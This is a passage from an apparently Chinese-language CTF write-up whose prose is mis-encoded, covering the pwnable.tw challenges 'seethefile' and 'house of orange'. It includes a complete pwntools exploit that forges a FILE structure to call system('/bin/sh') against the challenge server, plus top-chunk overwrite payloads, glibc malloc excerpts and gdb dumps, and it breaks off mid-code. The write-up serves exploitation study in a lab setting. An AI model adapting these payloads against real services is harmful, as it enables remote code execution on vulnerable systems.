ï¼Œæˆ‘ä»¬åˆ™èƒ½æ§åˆ¶ç¨‹åºæµç¨‹ï¼Œå…³é”®åœ¨äº ebx å’Œ eax ä¸¤ä¸ªå¯„å­˜å™¨</p><p><code>movsx  eax,BYTE PTR [ebx+0x46]</code> â€”&gt; eax == 0</p><p><code>mov    eax,DWORD PTR [ebx+eax*1+0x94]</code> â€”&gt; eax = [ebx+0x94] ;ebx æ­¤æ—¶ä¸º fp åœ°å€ã€‚</p><p>åˆ™æ­¤æ—¶ï¼Œ eax = fp + 0x94</p><p>æˆ‘ä»¬è¦æ§åˆ¶çš„è·³è½¬åœ°å€ä¸º  eax = [[fp+0x94]+0x44]</p><p>æ‰€ä»¥æˆ‘ä»¬è®¾ç½®å¦‚ä¸‹payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure></li></ul><p>  æ„é€ å‡ºæ¥çš„file ç»“æ„å¦‚ä¸‹ï¼š</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x804b260 0x94</span><br><span class="line">0000| 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0004| 0x804b264 --&gt; 0x68732f (<span class="string">&#x27;/sh&#x27;</span>)</span><br><span class="line">0008| 0x804b268 --&gt; 0x0 </span><br><span class="line">0012| 0x804b26c --&gt; 0x0 </span><br><span class="line">0016| 0x804b270 --&gt; 0x0 </span><br><span class="line">0020| 0x804b274 --&gt; 0x0 </span><br><span class="line">0024| 0x804b278 --&gt; 0x0 </span><br><span class="line">0028| 0x804b27c --&gt; 0x0 </span><br><span class="line">0032| 0x804b280 --&gt; 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0036| 0x804b284 --&gt; 0x0 </span><br><span class="line">0040| 0x804b288 --&gt; 0x0 </span><br><span class="line">0044| 0x804b28c --&gt; 0x0 </span><br><span class="line">0048| 0x804b290 --&gt; 0x0 </span><br><span class="line">0052| 0x804b294 --&gt; 0x0 </span><br><span class="line">0056| 0x804b298 --&gt; 0x0 </span><br><span class="line">0060| 0x804b29c --&gt; 0x0 </span><br><span class="line">0064| 0x804b2a0 --&gt; 0x0 </span><br><span class="line">0068| 0x804b2a4 --&gt; 0x0 </span><br><span class="line">0072| 0x804b2a8 --&gt; 0x804b270 --&gt; 0x0 </span><br><span class="line">0076| 0x804b2ac --&gt; 0x0 </span><br><span class="line">0080| 0x804b2b0 --&gt; 0x0 </span><br><span class="line">0084| 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0088| 0x804b2b8 --&gt; 0x0 </span><br><span class="line">0092| 0x804b2bc --&gt; 0x0 </span><br><span class="line">0096| 0x804b2c0 --&gt; 0x0 </span><br><span class="line">--More--(25/148)</span><br><span class="line">0100| 0x804b2c4 --&gt; 0x0 </span><br><span class="line">0104| 0x804b2c8 --&gt; 0x0 </span><br><span class="line">0108| 0x804b2cc --&gt; 0x0 </span><br><span class="line">0112| 0x804b2d0 --&gt; 0x0 </span><br><span class="line">0116| 0x804b2d4 --&gt; 0x0 </span><br><span class="line">0120| 0x804b2d8 --&gt; 0x0 </span><br><span class="line">0124| 0x804b2dc --&gt; 0x0 </span><br><span class="line">0128| 0x804b2e0 --&gt; 0x0 </span><br><span class="line">0132| 0x804b2e4 --&gt; 0x0 </span><br><span class="line">0136| 0x804b2e8 --&gt; 0x0 </span><br><span class="line">0140| 0x804b2ec --&gt; 0x0 </span><br><span class="line">0144| 0x804b2f0 --&gt; 0x0 </span><br><span class="line">0148| 0x804b2f4 --&gt; 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0152| 0x804b2f8 --&gt; 0xf7e51da0 (&lt;__libc_system&gt;:sub    esp,0xc)</span><br><span class="line">0156| 0x804b2fc --&gt; 0x0 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  æœ€åçš„ infoleak åªéœ€è¦ è¯» <code>/proc/self/map</code> å³å¯</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;15111&#x27;, &#x27;-t&#x27;, &#x27;OSXTerminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;23333&#x27;, &#x27;-t&#x27;, &#x27;terminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;/pwn/notiterm.py&#x27;</span>,<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io,elf,libc = init_pwn(<span class="string">&quot;./seethefile&quot;</span>,<span class="string">&quot;libc_32.so.6&quot;</span>,remote_detail = (<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>),is_env = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 1. Open</span></span><br><span class="line">  <span class="comment"># 2. Read</span></span><br><span class="line">  <span class="comment"># 3. Write to screen</span></span><br><span class="line">  <span class="comment"># 4. Close</span></span><br><span class="line">  <span class="comment"># 5. Exit</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## -------- read remote libc ---------</span></span><br><span class="line"><span class="comment"># read_file(&#x27;/proc/self/maps&#x27;)</span></span><br><span class="line"><span class="comment"># libc_addr = io.recvuntil(&quot;r-xp&quot;)</span></span><br><span class="line"><span class="comment"># print(libc_addr)</span></span><br><span class="line"><span class="comment"># libc.address = int(libc_addr.split(&#x27;-&#x27;)[-3].split(&#x27;\n&#x27;)[1], 16)</span></span><br><span class="line"><span class="comment"># # log.info(&quot;\033[33m&quot; + hex(libc.address) + &quot;\033[0m&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------- set localhost libc --------</span></span><br><span class="line"></span><br><span class="line">libc.address = <span class="number">0xf7e17000</span></span><br><span class="line">lg(<span class="string">&#x27;libc addr:&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b _IO_new_fclose</span></span><br><span class="line"><span class="string">    b *0xf7e74a60</span></span><br><span class="line"><span class="string">    b *0xF7E80910</span></span><br><span class="line"><span class="string">    b *0xF7E80917</span></span><br><span class="line"><span class="string">    b *0xf7e74a24</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- set fp ---&gt; buffer addr -------</span></span><br><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- fake fp ---&gt; _lock pointer to 0 -----</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x48,&#x27;\x00&#x27;) </span></span><br><span class="line"><span class="comment"># payload += p32(buffer+0x10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x94,&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># payload += p32(0x804b2f8 - 0x44)</span></span><br><span class="line"><span class="comment"># payload += p32(0xdeadbeef)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system addr:&#x27;</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">leave_name(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lg(&quot;libc addr:&quot;,libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-houseoforange"><a href="#0x02-houseoforange" class="headerlink" title="0x02 houseoforange"></a>0x02 houseoforange</h2><p>è¿™å…¶å®æ˜¯ä¸€ç§ï¼Œåœ¨æ²¡æœ‰ free çš„æƒ…å†µä¸‹ï¼Œæ„é€  unsorted bin è¿›è¡Œ libc leakçš„æ–¹æ³•ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4173">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4172</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305030416.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305030416.png"></a></p><p>å½“ç”¨æˆ·ç”³è¯·çš„ chunkï¼Œ top  chunk ä¸èƒ½æ»¡è¶³çš„æ—¶å€™ï¼Œæœ‰å¯èƒ½ä½¿ç”¨ sysmalloc è¿›è¡Œå†…å­˜åˆ†é…ï¼Œå½“è°ƒç”¨ sysmalloc åˆ†é…çš„æ—¶å€™ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªé€‰æ‹©</p><ol><li>mmap</li><li>æ‰©å±•brk</li></ol><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2336">sysmalloc source code</a></p><p>ä»æºç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œå¦‚æœå¾—æ»¡è¶³ <code>(*unsigned* *long*) (nb) &gt;= (*unsigned* *long*) (mp_.mmap_threshold)</code> ä¸æˆç«‹ï¼Œåˆ™ä¸ä¼šè°ƒç”¨mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">    try_mmap:</span><br></pre></td></tr></table></figure><p>å½“ç”³è¯·çš„ chunk å¤§å°ä¸å¤§äº mmap åˆ†é…é˜ˆå€¼ï¼Œmmap_threshold<code>çš„å€¼ä¸º</code>128*1024</p><p>æ‰©å±• brk top chunk çš„æ—¶å€™è¿˜æœ‰ä¸¤ä¸ªassert çš„å­˜åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸‹å°±æ˜¯ï¼š</p><ol><li><p>old_size &gt;= MINSIZEï¼Œå³old_sizeä¸èƒ½å¤ªå°</p></li><li><p>old_top è®¾ç½®äº† prev_inuse æ ‡å¿—ä½</p></li><li><p>old_endæ­£å¥½ä¸ºé¡µå°¾ï¼Œå³(&amp;old_top+old_size)&amp;(0x1000-1) == 0</p></li><li><p>old_size &lt; nb+MINSIZEï¼Œold_sizeä¸å¤Ÿéœ€æ±‚</p></li></ol><p>å½“ top chunk æ‰©å±•å®Œæ¯•ï¼Œæ—§çš„top chunkå°±ä¼šè¢«freeæ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">    set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">    set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>æ”¯æŒï¼Œå¦‚æœæˆ‘ä»¬èƒ½è¦†ç›– top chunkï¼Œåˆ™å¯èƒ½ä¼ªé€ ä¸€ä¸ª unsorte bin ï¼Œè¿›è¡Œinfo leak ã€‚ä»¥åŠæ­¤å¤„è¿˜æœ‰å¦å¤–ä¸€ä¸ª trick</p><p>å½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªlargebin çš„æ—¶å€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = smallbin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">     <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">         size |= PREV_INUSE;</span><br><span class="line">         <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">         assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">         <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">             &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">           &#123;</span><br><span class="line">             fwd = bck;</span><br><span class="line">             bck = bck-&gt;bk;</span><br><span class="line">             victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">             victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">             fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><code>malloc</code>æºç ä¸­è¿˜æŠŠ<code>old_top</code>çš„å †åœ°å€æ”¾åˆ°äº†å †é‡Œé¢ï¼Œæ‰€ä»¥å¦‚æœå†æ¬¡åˆ†é…æ—¶å€™å¦‚æœåˆ†é…å¤§å°ä¸º<code>largebin</code>(ä¹Ÿå°±æ˜¯å¤§äº512å­—èŠ‚)çš„<code>chunk</code>çš„è¯ï¼Œå°±æ˜¯å¯ä»¥æ—¢æ³„éœ²<code>libc</code>åˆå¯ä»¥æ³„éœ²<code>heap</code>ã€‚</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;@          House of Orange          @&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Build the house                  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. See the house                    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Upgrade the house                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Give up                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice : &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å››ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œé‡ç‚¹åœ¨ build å’Œupgrade</p><ul><li><p>build</p><p>ç¨‹åºé€»è¾‘è¿˜æ¯”è¾ƒæ¸…æ™°çš„ï¼Œä¸€å…±å¯ä»¥<code>build</code>å››æ¬¡ï¼Œç„¶åæ¯æ¬¡<code>build</code>çš„è¯å°±æ˜¯3æ¬¡å †åˆ†é…ï¼Œä¸¤æ¬¡<code>malloc</code>ï¼Œä¸€æ¬¡<code>calloc</code>ï¼Œå…¶ä¸­ä¸€æ¬¡<code>malloc</code>æ˜¯å›ºå®šåˆ†é…<code>0x10</code>å­—èŠ‚ä½œä¸ºæ§åˆ¶å †å—ï¼Œé‡Œé¢å­˜æ”¾ç€<code>name</code>å’Œ<code>color</code>çš„ä¿¡æ¯ï¼Œå¦å¤–æŒ‰è¾“å…¥åˆ†é…<code>name</code>çš„å¤§å°ã€‚</p></li></ul><p>  <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305033957.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305033957.png"></a></p><ul><li><p>upgrade</p></li></ul><p>åœ¨<code>upgrade</code>å‡½æ•°ä¸­ï¼Œä¿®æ”¹<code>name</code>æ—¶å€™ä¸é¡¾å®é™…<code>chunk</code>çš„å †å¤§å°æ˜¯å¤šå°‘ï¼Œç›´æ¥è¿›è¡Œç¼–è¾‘ï¼Œæœ€å¤§å¯ç¼–è¾‘<code>0x1000</code>å¤§å°ï¼Œå› è€Œå­˜åœ¨æº¢å‡ºã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305034058.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305034058.png"></a></p><p>ç”±äºæ²¡æœ‰ free ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ä¸Šè¿°åŸç†çš„æ–¹æ³•è¿›è¡Œ free chunk to unsorte bin</p><h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="overwrite-the-top-chunk"><a href="#overwrite-the-top-chunk" class="headerlink" title="overwrite the top chunk"></a>overwrite the top chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡ å †æº¢å‡ºæ¼æ´è¦†ç›– top chunkï¼Œå¹¶æ„é€ å¥½top chunk çš„size å’Œ flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557580e0 (size : 0xf20)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$ x/20gx 0x5555557580e0</span><br><span class="line">0x5555557580e0:0x00000000000000000x0000000000000f21</span><br><span class="line">0x5555557580f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæ„é€  to chunk size ä¸º 0xf21ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå½“ç”³è¯·å¤§äº 0xf21 size çš„chunk çš„æ—¶å€™ï¼Œå³å¯å‘ç”Ÿ free</p><h4 id="trigger-int-free"><a href="#trigger-int-free" class="headerlink" title="trigger _int_free()"></a>trigger _int_free()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upgrade(pay, 